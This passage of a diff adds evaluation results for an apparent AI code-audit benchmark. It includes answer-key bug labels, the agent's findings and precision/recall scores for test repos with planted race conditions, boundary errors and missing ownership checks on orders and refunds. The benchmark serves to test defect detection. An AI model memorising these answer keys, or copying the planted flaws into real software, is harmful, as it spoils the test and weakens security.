+              "detail": "出错所需的交错：线程 A 在 L15 判断 `cls._instance is None` 为真，随后在 L16 赋值前被切走；线程 B 也判断为真，并完成 L16 赋值与 L17 返回对象 B；A 恢复后再次执行 L16，把 cls._instance 覆盖为对象 A 并返回 A。\n结果：B 拿到的实例从此不再是 `instance()` 的返回值，缓存的「唯一实例」前提被破坏 —— 后续 snapshot() 之类的状态读取可能落在被遗弃的那个实例上。触发条件：首次调用 instance() 的那一刻有并发（进程启动/首批并发请求），之后由于已有实例通常不再复现，属于「特定时序才触发、影响可控」。\n注意与上一条区分：这里是重复构造，不是数据丢失。",
+              "evidence": "L14-L17：\n  def instance(cls) -> \"ConfigCache\":\n      if cls._instance is None:\n          cls._instance = ConfigCache()\n      return cls._instance\n判断与赋值之间无任何同步；文件已导入 threading（L3）并定义了 _lock（L7），但此处未使用。"
+            },
+            {
+              "file": "app/cache.py",
+              "line": 29,
+              "severity": "warn",
+              "title": "allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配",
+              "detail": "出错所需的交错：两个线程并发调用 allocate_slot(used, total)。\n1) A 在 L29 读出 `slot = len(used)`（例如 0）；\n2) B 在 A 尚未执行 L32 前也读出 `slot = len(used)`（仍为 0）；\n3) 两者都通过 L30 的边界检查，A 执行 L32 把 0 加入集合、B 也把 0 加入集合。\n结果：两个调用者拿到同一个槽位 0 —— 调用方会认为各自独占槽位，实际发生覆盖/冲突（数据错位）；同时集合只增加了一个元素，槽位被永久泄漏。\n边界场景：`used = {0,1}`、total = 3 时，A 与 B 都读到 slot = 2，L30 的 `2 >= 3` 为假、都不抛错，于是两个线程都被分配了本应是最后一个的槽位 2，total 上限被突破。\n触发条件：同一 set/limit 上的并发分配，即通常的使用方式",
+              "evidence": "L29-L33：\n  slot = len(used)\n  if slot >= total:\n      raise RuntimeError(\"no slot\")\n  used.add(slot)\n  return slot\n读 len、比较、add 三步之间无锁；参数 `used` 由调用方共享传入，函数内未做任何同步。"
+            },
+            {
+              "file": "app/cache.py",
+              "line": 38,
+              "severity": "warn",
+              "title": "record_hit 的无锁「读-改-写」会丢计数，且与 snapshot 上加锁的读取口径不一致",
+              "detail": "出错所需的交错：两个线程并发执行 `hits = hits + 1`。\n1) A 读到 _counter['hits']（例如 41）；\n2) B 也读到 41（A 尚未写回）；\n3) A 写回 42，B 写回 42。\n结果：两次命中只被记录为一次，计数永久偏少。触发条件：任何多线程累计命中数的场景，命中越频繁丢失越多。副作用同样是「显式失败缺失」：计数器偏小不会报错，只会静默失真。\n附带的口径问题：snapshot() 在 L43 用 `with _lock:` 读 _counter，看起来像有并发保护，但唯一的写者 record_hit 从不持锁（grep 确认 _lock 只出现在 L7 与 L43），因此这把锁提供不了任何互斥语义，反而给出「计数受保护」的错误印象。",
+              "evidence": "record_hit（L36-L39）：\n  _counter[\"hits\"] = _counter[\"hits\"] + 1\n  return _counter[\"hits\"]\n复合赋值，读与写之间可被线程切换；同一文件的 snapshot（L42-L44）却写了 `with _lock:`：\n  with _lock:\n      return dict(_counter)\n即写者无锁、读者有锁，同一状态两套口径。"
+            }
+          ],
+          "matched": 3,
+          "missed": [
+            "CONC03-a app/cache.py:32"
+          ],
+          "missed_detail": [
+            {
+              "code": "CONC03-a",
+              "file": "app/cache.py",
+              "line": 32,
+              "description": "读 len 与 add 之间无锁，两个线程会拿到同一个槽位",
+              "nearest_prediction": {
+                "file": "app/cache.py",
+                "line": 29,
+                "severity": "warn",
+                "title": "allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配",
+                "detail": "出错所需的交错：两个线程并发调用 allocate_slot(used, total)。\n1) A 在 L29 读出 `slot = len(used)`（例如 0）；\n2) B 在 A 尚未执行 L32 前也读出 `slot = len(used)`（仍为 0）；\n3) 两者都通过 L30 的边界检查，A 执行 L32 把 0 加入集合、B 也把 0 加入集合。\n结果：两个调用者拿到同一个槽位 0 —— 调用方会认为各自独占槽位，实际发生覆盖/冲突（数据错位）；同时集合只增加了一个元素，槽位被永久泄漏。\n边界场景：`used = {0,1}`、total = 3 时，A 与 B 都读到 slot = 2，L30 的 `2 >= 3` 为假、都不抛错，于是两个线程都被分配了本应是最后一个的槽位 2，total 上限被突破。\n触发条件：同一 set/limit 上的并发分配，即通常的使用方式",
+                "evidence": "L29-L33：\n  slot = len(used)\n  if slot >= total:\n      raise RuntimeError(\"no slot\")\n  used.add(slot)\n  return slot\n读 len、比较、add 三步之间无锁；参数 `used` 由调用方共享传入，函数内未做任何同步。"
+              },
+              "distance": 3
+            }
+          ],
+          "spurious": [
+            {
+              "file": "app/cache.py",
+              "line": 29,
+              "severity": "warn",
+              "title": "allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配",
+              "detail": "出错所需的交错：两个线程并发调用 allocate_slot(used, total)。\n1) A 在 L29 读出 `slot = len(used)`（例如 0）；\n2) B 在 A 尚未执行 L32 前也读出 `slot = len(used)`（仍为 0）；\n3) 两者都通过 L30 的边界检查，A 执行 L32 把 0 加入集合、B 也把 0 加入集合。\n结果：两个调用者拿到同一个槽位 0 —— 调用方会认为各自独占槽位，实际发生覆盖/冲突（数据错位）；同时集合只增加了一个元素，槽位被永久泄漏。\n边界场景：`used = {0,1}`、total = 3 时，A 与 B 都读到 slot = 2，L30 的 `2 >= 3` 为假、都不抛错，于是两个线程都被分配了本应是最后一个的槽位 2，total 上限被突破。\n触发条件：同一 set/limit 上的并发分配，即通常的使用方式",
+              "evidence": "L29-L33：\n  slot = len(used)\n  if slot >= total:\n      raise RuntimeError(\"no slot\")\n  used.add(slot)\n  return slot\n读 len、比较、add 三步之间无锁；参数 `used` 由调用方共享传入，函数内未做任何同步。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/cache.py",
+                "line": 29,
+                "severity": "warn",
+                "title": "allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配",
+                "detail": "出错所需的交错：两个线程并发调用 allocate_slot(used, total)。\n1) A 在 L29 读出 `slot = len(used)`（例如 0）；\n2) B 在 A 尚未执行 L32 前也读出 `slot = len(used)`（仍为 0）；\n3) 两者都通过 L30 的边界检查，A 执行 L32 把 0 加入集合、B 也把 0 加入集合。\n结果：两个调用者拿到同一个槽位 0 —— 调用方会认为各自独占槽位，实际发生覆盖/冲突（数据错位）；同时集合只增加了一个元素，槽位被永久泄漏。\n边界场景：`used = {0,1}`、total = 3 时，A 与 B 都读到 slot = 2，L30 的 `2 >= 3` 为假、都不抛错，于是两个线程都被分配了本应是最后一个的槽位 2，total 上限被突破。\n触发条件：同一 set/limit 上的并发分配，即通常的使用方式",
+                "evidence": "L29-L33：\n  slot = len(used)\n  if slot >= total:\n      raise RuntimeError(\"no slot\")\n  used.add(slot)\n  return slot\n读 len、比较、add 三步之间无锁；参数 `used` 由调用方共享传入，函数内未做任何同步。"
+              },
+              "nearest_label": {
+                "code": "CONC03-a",
+                "file": "app/cache.py",
+                "line": 32
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [],
+          "precision": 0.75,
+          "recall": 0.75,
+          "f1": 0.75,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.5,
+              "recall": 0.5,
+              "f1": 0.5,
+              "spurious": 2,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.5,
+              "recall": 0.5,
+              "f1": 0.5,
+              "spurious": 2,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.75,
+              "recall": 0.75,
+              "f1": 0.75,
+              "spurious": 1,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s5-boundaries",
+      "tier": "L5 高级",
+      "style": "诊断型（先立前提）",
+      "goal": "先推导每个函数对调用方隐含的前提（区间开闭、页码基准、单位与取值范围），再判断实现有没有落实这些前提。",
+      "audit_root": "examples\\s5-boundaries\\repo",
+      "labels": [
+        {
+          "code": "BOUND01-a",
+          "file": "app/limits.py",
+          "line": 11,
+          "description": "两端皆闭，恰好落在边界的事件被相邻两个窗口各计一次"
+        },
+        {
+          "code": "BOUND02-a",
+          "file": "app/limits.py",
+          "line": 16,
+          "description": "hits 可大于 LIMIT，此处会返回负数并直接被展示"
+        },
+        {
+          "code": "BOUND03-a",
+          "file": "app/limits.py",
+          "line": 21,
+          "description": "页码从 1 起时应为 (page-1)*size，否则首屏被整页跳过"
+        },
+        {
+          "code": "BOUND04-a",
+          "file": "app/limits.py",
+          "line": 26,
+          "description": "whole 为 0 时抛 ZeroDivisionError，调用方未做防护"
+        },
+        {
+          "code": "BOUND05-a",
+          "file": "app/limits.py",
+          "line": 31,
+          "description": "含尾应再 +1，跨月/跨年时同样少算一天"
+        },
+        {
+          "code": "BOUND06-a",
+          "file": "app/limits.py",
+          "line": 36,
+          "description": "未对 24 取模也未归一化，跨日会算出不存在的小时"
+        }
+      ],
+      "rule": {
+        "findings": 0,
+        "recall": 0.0,
+        "precision": 0.0,
+        "f1": 0.0,
+        "found": []
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 142.8,
+          "iterations": 11,
+          "stop_reason": "finished",
+          "summary": "审查范围：工作区唯一文件 app/limits.py（37 行，6 个函数），list_files + grep 确认无其它模块、无调用点，故按「函数声明的契约 → 调用方由契约推出的前提 → 实现是否落实」逐函数核对。\n\n主要发现（6 条，1 阻断 / 3 警告 / 2 建议）：\n1. blocker — page_offset (L21)：docstring 声明页码从 1 开始，但返回 page*size 而非 (page-1)*size。调用方按文档传 page=1 时 offset=20，第 1~20 条记录在任何页里都取不到，属静默丢数据；page=0 才等价首页，而 0 不在声明取值域内。\n2. warn — days_between (L31)：docstring 声明「含首尾两天」（闭区间语义），实现是端点差 (end-start).days。同日返回 0、1/1→1/3 返回 2，比契约恒少 1。\n3. warn — quota_key (L36-37)：时区换算 minutes_west//60 丢掉分钟位（-330//60=-6），UTC+5:30/+9:30/-3:30 这类非整小时时区的配额桶边界整体平移 30 分钟；hour 不做 %24 归一化、日期用未平移的 UTC 日期，会产生 \"-8\" 这类非法小时值且日期与客户端本地日期不一致。\n4. war",
+          "warnings": [
+            "有 1 次调用被护栏拒绝，总结里没有说明",
+            "运行中发生 1 次工具失败：\n- run_command: HighRiskBlocked - `run_command` 属于高风险工具，当前运行未开启高风险权限。",
+            "有 1 次工具调用被护栏拒绝。"
+          ],
+          "usage": {
+            "prompt": 113994,
+            "completion": 22288,
+            "cached": 98688
+          },
+          "cache_hit": 0.866,
+          "findings": [
+            {
+              "file": "app/limits.py",
+              "line": 21,
+              "severity": "blocker",
+              "title": "page_offset 与文档声明的「页码从 1 开始」不符，第 1 页会被整页跳过",
+              "detail": "docstring 明确约定 page 以 1 为基准（L20），因此对调用方的隐含前提是「offset = (page-1)*size，page=1 时 offset=0」。实现直接返回 page * size，等价于按 0 基准页码计算。调用方按文档传 page=1,size=20 时得到 offset=20，第 1~20 条记录永远不会出现在任何页里（第 1 页返回第 21~40 条），属于静默丢数据；传 page=0 才能拿到首页，但 0 不在声明的取值域内。",
+              "evidence": "L20: `\"\"\"按页码算偏移量（页码从 1 开始）。\"\"\"`；L21: `return page * size`。page=1, size=20 → 20（应为 0）。"
+            },
+            {
+              "file": "app/limits.py",
+              "line": 31,
+              "severity": "warn",
+              "title": "days_between 声明「含首尾两天」但实现是半开区间，结果恒少 1",
+              "detail": "L30 的契约是闭区间计数（含首尾两天），隐含前提为 start 与 end 两天都要计入。实现用 `(end - start).days`，只算端点之差：同一天返回 0（按契约应为 1），1/1→1/3 返回 2（按契约应为 3）。任何按此函数计费、计算时长或判断「是否超过 N 天」的调用方都会系统性偏小一天。",
+              "evidence": "L30: `\"\"\"含首尾两天的天数。\"\"\"`；L31: `return (end - start).days`。(date(2026,1,1), date(2026,1,1)) → 0；(date(2026,1,1), date(2026,1,3)) → 2，而含首尾为 3。"
+            },
+            {
+              "file": "app/limits.py",
+              "line": 36,
+              "severity": "warn",
+              "title": "quota_key 的时区换算被截断且未归一化，非整小时时区的配额桶边界错位",
+              "detail": "docstring 声明「按客户端时区构造配额键」，隐含前提是 hour 落在 0~23、日期随客户端时区走、分钟偏移不能丢。实现有两处未落实：(1) `minutes_west // 60` 直接丢掉分钟部分（Python 是向下取整，-330//60 = -6，-270//60 = -5），对 UTC+5:30 / +9:30 / -3:30 这类非整小时时区，配额桶的切换点会被整体平移 30 分钟（本地 :30 才重置，而非本地整点）；(2) `hour` 不做 `% 24` 归一化、`strftime(\"%Y-%m-%d\")` 用的是未平移的 UTC 日期，因此键里会出现 `-8`、`25` 这种非法小时值，且日期与客户端本地日期不一致。基于 L5/L6 的配额语义（每窗口 LIMIT 次），桶边界错位意味着本地整点附近的请求会被记到相邻桶，限流在该时刻少算/多算。",
+              "evidence": "L36: `hour = now.hour + minutes_west // 60`；L37: `return now.strftime(\"%Y-%m-%d\") + \":\" + str(hour)`。minutes_west=-480（UTC+8，Python time.timezone 符号约定）时 now.hour=0 → hour=-8，日期仍是 UTC 当天；minutes_west=-330（UTC+5:30）时 00:15 与 00:45 落到同一桶，桶边界在本地 :30。"
+            },
+            {
+              "file": "app/limits.py",
+              "line": 26,
+              "severity": "warn",
+              "title": "percentage 未落实「whole 非 0」这一隐含前提，whole=0 时抛 ZeroDivisionError",
+              "detail": "`part / whole * 100` 的隐含前提是 whole != 0。函数没有任何防护，调用方在「总数为 0」的常见场景（空样本、空队列统计）会直接抛 ZeroDivisionError 而不是拿到 0 或 None。此外函数也不声明 part/whole 的取值范围与返回值域（part > whole 时会返回 >100 的值），调用方无法据签名判断。",
+              "evidence": "L24-26: `def percentage(part: int, whole: int) -> float:` / `\"\"\"计算占比。\"\"\"` / `return part / whole * 100`。"
+            },
+            {
+              "file": "app/limits.py",
+              "line": 16,
+              "severity": "note",
+              "title": "remaining 未声明/约束返回值下界，hits 超过 LIMIT 时返回负数",
+              "detail": "docstring 只说「还剩多少配额」，未声明 hits 的取值域，调用方会自然地把它当作「非负的剩余量」直接展示或比较（如 `if remaining(hits) == 0`）。实现无下界裁剪，当 hits 超过 LIMIT（并发下窗口内计数可能超过上限，或 hits 来自累计值）时返回负数，这类调用方会拿到 -20 这种越界值：以 `== 0` 判断「配额耗尽」会永远不成立。",
+              "evidence": "L14-16: `def remaining(hits: int) -> int:` / `\"\"\"还剩多少配额。\"\"\"` / `return LIMIT - hits`。LIMIT=100（L6），故 hits=120 → -20。"
+            },
+            {
+              "file": "app/limits.py",
+              "line": 11,
+              "severity": "note",
+              "title": "in_window 含两端闭区间且不校验参数次序，边界事件会被相邻窗口重复计入",
+              "detail": "docstring 只说「判断事件是否落在窗口内」，没有声明区间开闭；实现两端都用 `<=`，即闭区间 [start, now]。对本文件同级的限流语义（WINDOW_SECONDS=60、LIMIT=100，见 L5-L6）而言，隐含前提通常是「窗口左闭右开」——否则落在窗口右端点 ts == now 上的事件会被相邻两个窗口各计一次，窗口切换瞬间的计数偏大 1，可能让限流提前触发。另外函数不校验 start <= now：参数次序颠倒或 start 晚于 now 时不会报错，而是静默地对所有事件返回 False（看起来像「窗口内没有事件」），把配置错误伪装成空结果。",
+              "evidence": "L9-11: `def in_window(ts: float, start: float, now: float) -> bool:` / `\"\"\"判断事件是否落在窗口内。\"\"\"` / `return start <= ts and ts <= now`——左端与右端均为闭，且文件内的 WINDOW_SECONDS 常量未参与任何边界推导；start > now 时表达式恒为 False 且无任何告警。"
+            }
+          ],
+          "matched": 6,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [],
+          "spurious_detail": [],
+          "duplicates": [],
+          "precision": 1.0,
+          "recall": 1.0,
+          "f1": 1.0,
+          "tolerance_curve": {
+            "0": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 0
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s6-authz-logic",
+      "tier": "L6 高级",
+      "style": "诊断型（先建模型）",
+      "goal": "先建立这个服务的权限模型与订单状态机，再逐一判断实现有没有落实它。重点是：谁能看到什么、哪些状态转换是允许的。",
+      "audit_root": "examples\\s6-authz-logic\\repo",
+      "labels": [
+        {
+          "code": "AUTHZ01-a",
+          "file": "app/orders.py",
+          "line": 12,
+          "description": "只按 order_id 查询，未校验 order 归属（越权读取他人订单）"
+        },
+        {
+          "code": "AUTHZ02-a",
+          "file": "app/orders.py",
+          "line": 19,
+          "description": "只拦「已发货」，已退款/已完成的订单仍可取消并触发二次退款"
+        },
+        {
+          "code": "AUTHZ03-a",
+          "file": "app/orders.py",
+          "line": 25,
+          "description": "全局权限直接放行，静默覆盖了 CLIENT_DENY 里配的逐 client 拒绝"
+        },
+        {
+          "code": "AUTHZ04-a",
+          "file": "app/orders.py",
+          "line": 30,
+          "description": "未校验 amount 是否超过实付金额，也未校验是否已退过款"
+        }
+      ],
+      "rule": {
+        "findings": 0,
+        "recall": 0.0,
+        "precision": 0.0,
+        "f1": 0.0,
+        "found": []
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 60.6,
+          "iterations": 7,
+          "stop_reason": "finished",
+          "summary": "审计对象是 app/orders.py（工作区唯一文件，31 行，已全文读完）。git diff 呈现的是外层 harness 仓（backend/eval、backend/tests）的改动，不在被审范围内，已排除。\n\n先建立的模型与实现对照结论：\n1) 权限模型：文件里有唯一判定入口 can_view（L22-L26），语义是「VIEW_PERMISSIONS 为 global 则放行，否则看是否在 CLIENT_DENY 拒绝名单里」。但 grep 全仓 can_view 只命中定义本身，get_order / cancel / refund 三个数据入口都没有调用它，权限判定完全未接入读写路径。\n2) 订单状态机：实际生效的规则就是 cancel 里的「status == shipped 则拒绝，否则置为 cancelled」（L17-L19），没有状态常量、没有允许迁移表。\n\n据此确认 5 个缺陷（4 blocker / 1 warn）：\n- blocker：get_order 接收 user_id 却完全不用（L9-L12），任意用户凭 order_id 可读任意订单；订单不存在时返回 None 而非报错。\n- blocker：can_view 零调用点，权限模型没有落到任何路径上。\n- blocker：cancel 同样不使用 user_id（L14-L20），任意用",
+          "warnings": [
+            "运行中发生 2 次工具失败：\n- run_command: HighRiskBlocked - `run_command` 属于高风险工具，当前运行未开启高风险权限。\n- run_command: HighRiskBlocked - `run_command` 属于高风险工具，当前运行未开启高风险权限。",
+            "有 2 次工具调用被护栏拒绝。"
+          ],
+          "usage": {
+            "prompt": 62206,
+            "completion": 9354,
+            "cached": 51200
+          },
+          "cache_hit": 0.823,
+          "findings": [
+            {
+              "file": "app/orders.py",
+              "line": 12,
+              "severity": "blocker",
+              "title": "get_order 完全忽略 user_id，任何用户可读取任意订单",
+              "detail": "get_order 的签名声明了调用者身份 user_id（L9），但函数体只做 `ORDERS.get(order_id)` 后直接返回（L11-L12），既没有校验订单归属，也没有调用同文件里的 can_view 做 client 级可见性判定。只要知道 order_id，任意 user_id 都能拿到订单详情，越权读取无需任何特殊条件。另外 L11 用 dict.get 而非下标，订单不存在时返回 None，调用方（或 HTTP 层）会把它当成「查到订单」继续处理，进而在后续 `order[\"...\"]` 处触发 TypeError；两种返回语义（不存在 vs 无权限）也没有区分。",
+              "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:` 之后 L10 docstring、L11 `order = ORDERS.get(order_id)`、L12 `return order` —— user_id 在整个函数体内无任何出现。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 22,
+              "severity": "blocker",
+              "title": "can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径",
+              "detail": "can_view 是文件里唯一的权限判定入口（L22-L26），但 grep 全仓 `can_view` 只命中这一处定义，get_order / cancel / refund 三个数据入口都没有调用它。也就是说模块声明了「谁能看到什么」的模型，却没有任何一条路径落实它，权限判定形同虚设。此外该实现是默认放行语义：L26 `return client_id not in CLIENT_DENY.get(user_id, ())`，任何未在 CLIENT_DENY 中登记的用户对未登记 client 一律返回 True；由于 CLIENT_DENY/VIEW_PERMISSIONS 在文件里初始化为空字典（L4-L5）且没有任何写入点，当前状态下 can_view 对任意 (client_id, user_id) 组合恒为 True。（`not in` 与 CLIENT_DENY 这个「拒",
+              "evidence": "grep 结果仅 `app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无其他命中；L24-L26 为全部实现；L4 `VIEW_PERMISSIONS = {}`、L5 `CLIENT_DENY = {}` 全文件无赋值/更新。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 16,
+              "severity": "blocker",
+              "title": "cancel 不校验 user_id，任意用户可取消他人订单",
+              "detail": "cancel 的签名同样接收 user_id（L14），但函数体（L16-L20）只按 order_id 取单后直接改状态，从未使用 user_id，也没有订单归属/角色校验。任何持 order_id 的调用者都能把他人订单置为 cancelled，属于越权写操作。与 get_order 一样，L16 用 dict.get，订单不存在时 order 为 None，随后 L17 `order[\"status\"]` 直接抛 TypeError 而不是明确报错。",
+              "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`，L16 `order = ORDERS.get(order_id)`，L17-L19 直接读取并改写 status；user_id 在函数体内无任何使用。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 17,
+              "severity": "warn",
+              "title": "cancel 的状态守卫只挡 shipped，重复取消与终态订单仍可迁移",
+              "detail": "cancel 的状态守卫只覆盖 shipped 一个状态（L17-L18），其余状态一律放行到 cancelled。由此 `cancelled` 订单可以再次取消、已完成/已退款订单也能被取消，重复取消会覆盖已有状态并让调用方误以为发生了新的状态迁移。文件里没有任何状态常量或允许迁移表，实际生效的「状态机」就是「非 shipped 即变为 cancelled」，缺少对源状态集合的约束。",
+              "evidence": "L17 `if order[\"status\"] == \"shipped\":`，L18 `raise PermissionError(\"shipped\")`，L19 `order[\"status\"] = \"cancelled\"` —— 只对 shipped 一个状态设限，cancelled/refunded 等终态无判断。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 30,
+              "severity": "blocker",
+              "title": "refund 未校验金额范围与累计上限，可为负或超额退款",
+              "detail": "refund 只做 `order[\"refunded_cents\"] + amount` 累加（L30），既不校验 amount 的符号也不校验累计退款是否超过订单金额：传入负数会让 refunded_cents 变小（等价于冲销已发生的退款），传入超大值可使累计退款远超订单总额。同时 L30 假设 `refunded_cents` 键一定存在，键缺失时抛 KeyError。此外该方法只接收 order 与 amount，不接受调用者身份，函数内部无任何权限/归属校验，任意调用方都能对任意订单纯发起退款；退款这一资金操作与 can_view 权限体系也没有任何连接点。",
+              "evidence": "L28 `def refund(self, order: dict, amount: int) -> dict:`，L30 `order[\"refunded_cents\"] = order[\"refunded_cents\"] + amount` 与 L31 `return order` 构成完整实现，无 amount 范围检查、无累计上限、无 user_id 参数。"
+            }
+          ],
+          "matched": 3,
+          "missed": [
+            "AUTHZ03-a app/orders.py:25"
+          ],
+          "missed_detail": [
+            {
+              "code": "AUTHZ03-a",
+              "file": "app/orders.py",
+              "line": 25,
+              "description": "全局权限直接放行，静默覆盖了 CLIENT_DENY 里配的逐 client 拒绝",
+              "nearest_prediction": {
+                "file": "app/orders.py",
+                "line": 22,
+                "severity": "blocker",
+                "title": "can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径",
+                "detail": "can_view 是文件里唯一的权限判定入口（L22-L26），但 grep 全仓 `can_view` 只命中这一处定义，get_order / cancel / refund 三个数据入口都没有调用它。也就是说模块声明了「谁能看到什么」的模型，却没有任何一条路径落实它，权限判定形同虚设。此外该实现是默认放行语义：L26 `return client_id not in CLIENT_DENY.get(user_id, ())`，任何未在 CLIENT_DENY 中登记的用户对未登记 client 一律返回 True；由于 CLIENT_DENY/VIEW_PERMISSIONS 在文件里初始化为空字典（L4-L5）且没有任何写入点，当前状态下 can_view 对任意 (client_id, user_id) 组合恒为 True。（`not in` 与 CLIENT_DENY 这个「拒",
+                "evidence": "grep 结果仅 `app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无其他命中；L24-L26 为全部实现；L4 `VIEW_PERMISSIONS = {}`、L5 `CLIENT_DENY = {}` 全文件无赋值/更新。"
+              },
+              "distance": 3
+            }
+          ],
+          "spurious": [
+            {
+              "file": "app/orders.py",
+              "line": 22,
+              "severity": "blocker",
+              "title": "can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径",
+              "detail": "can_view 是文件里唯一的权限判定入口（L22-L26），但 grep 全仓 `can_view` 只命中这一处定义，get_order / cancel / refund 三个数据入口都没有调用它。也就是说模块声明了「谁能看到什么」的模型，却没有任何一条路径落实它，权限判定形同虚设。此外该实现是默认放行语义：L26 `return client_id not in CLIENT_DENY.get(user_id, ())`，任何未在 CLIENT_DENY 中登记的用户对未登记 client 一律返回 True；由于 CLIENT_DENY/VIEW_PERMISSIONS 在文件里初始化为空字典（L4-L5）且没有任何写入点，当前状态下 can_view 对任意 (client_id, user_id) 组合恒为 True。（`not in` 与 CLIENT_DENY 这个「拒",
+              "evidence": "grep 结果仅 `app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无其他命中；L24-L26 为全部实现；L4 `VIEW_PERMISSIONS = {}`、L5 `CLIENT_DENY = {}` 全文件无赋值/更新。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 16,
+              "severity": "blocker",
+              "title": "cancel 不校验 user_id，任意用户可取消他人订单",
+              "detail": "cancel 的签名同样接收 user_id（L14），但函数体（L16-L20）只按 order_id 取单后直接改状态，从未使用 user_id，也没有订单归属/角色校验。任何持 order_id 的调用者都能把他人订单置为 cancelled，属于越权写操作。与 get_order 一样，L16 用 dict.get，订单不存在时 order 为 None，随后 L17 `order[\"status\"]` 直接抛 TypeError 而不是明确报错。",
+              "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`，L16 `order = ORDERS.get(order_id)`，L17-L19 直接读取并改写 status；user_id 在函数体内无任何使用。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 22,
+                "severity": "blocker",
+                "title": "can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径",
+                "detail": "can_view 是文件里唯一的权限判定入口（L22-L26），但 grep 全仓 `can_view` 只命中这一处定义，get_order / cancel / refund 三个数据入口都没有调用它。也就是说模块声明了「谁能看到什么」的模型，却没有任何一条路径落实它，权限判定形同虚设。此外该实现是默认放行语义：L26 `return client_id not in CLIENT_DENY.get(user_id, ())`，任何未在 CLIENT_DENY 中登记的用户对未登记 client 一律返回 True；由于 CLIENT_DENY/VIEW_PERMISSIONS 在文件里初始化为空字典（L4-L5）且没有任何写入点，当前状态下 can_view 对任意 (client_id, user_id) 组合恒为 True。（`not in` 与 CLIENT_DENY 这个「拒",
+                "evidence": "grep 结果仅 `app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无其他命中；L24-L26 为全部实现；L4 `VIEW_PERMISSIONS = {}`、L5 `CLIENT_DENY = {}` 全文件无赋值/更新。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ02-a",
+                "file": "app/orders.py",
+                "line": 19
+              },
+              "distance": 3,
+              "in_same_file": true
+            },
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 16,
+                "severity": "blocker",
+                "title": "cancel 不校验 user_id，任意用户可取消他人订单",
+                "detail": "cancel 的签名同样接收 user_id（L14），但函数体（L16-L20）只按 order_id 取单后直接改状态，从未使用 user_id，也没有订单归属/角色校验。任何持 order_id 的调用者都能把他人订单置为 cancelled，属于越权写操作。与 get_order 一样，L16 用 dict.get，订单不存在时 order 为 None，随后 L17 `order[\"status\"]` 直接抛 TypeError 而不是明确报错。",
+                "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`，L16 `order = ORDERS.get(order_id)`，L17-L19 直接读取并改写 status；user_id 在函数体内无任何使用。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ02-a",
+                "file": "app/orders.py",
+                "line": 19
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [],
+          "precision": 0.6,
+          "recall": 0.75,
+          "f1": 0.667,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.4,
+              "recall": 0.5,
+              "f1": 0.444,
